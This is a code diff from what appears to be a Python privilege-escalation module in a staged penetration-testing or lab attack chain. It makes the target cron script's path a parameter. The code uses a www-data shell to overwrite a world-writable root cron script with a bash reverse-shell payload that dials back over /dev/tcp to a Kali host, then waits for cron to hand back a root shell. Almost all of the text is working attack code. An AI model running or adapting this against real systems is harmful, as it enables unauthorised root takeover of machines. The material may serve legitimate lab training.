@@ -19,16 +19,18 @@ def send_command(shell, command):
     time.sleep(0.5)
 
 
-def run(www_shell, kali_host=KALI_HOST):
+def run(www_shell, kali_host=KALI_HOST, cron_script=CLEANUP_SCRIPT):
     """
     Run the privilege-escalation step.
 
     Args:
-        www_shell (socket): bash connection as www-data, handed in from the
-            previous step.
-        kali_host (str):    IP / hostname of the Kali box that the
-            reverse-shell payload will dial back to (overrides the module
-            default).
+        www_shell (socket):   bash connection as www-data, handed in from the
+                              previous step.
+        kali_host (str):      IP / hostname of the Kali box that the
+                              reverse-shell payload will dial back to.
+        cron_script (str):    path to the world-writable root cron script,
+                              discovered by post_exploit_recon. Falls back to
+                              the module-level default if not supplied.
 
     Returns:
         root_shell (socket): bash connection as root, handed off to the
@@ -47,10 +49,10 @@ def run(www_shell, kali_host=KALI_HOST):
     try:
         # Overwrite cleanup.sh with a reverse-shell payload.
         # `>` truncates, `>>` appends.
-        print("[*] Overwriting cleanup.sh...")
-        send_command(www_shell, f"echo '#!/bin/bash' > {CLEANUP_SCRIPT}")
-        send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{kali_host}/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
-        print("[+] cleanup.sh overwritten successfully")
+        print(f"[*] Overwriting {cron_script}...")
+        send_command(www_shell, f"echo '#!/bin/bash' > {cron_script}")
+        send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{kali_host}/{PORT_ROOT} 0>&1' >> {cron_script}")
+        print(f"[+] {cron_script} overwritten successfully")
         print("[*] Waiting for cron job (max. 60 seconds)...")
 
         # Cron runs every minute → wait up to 70 seconds.
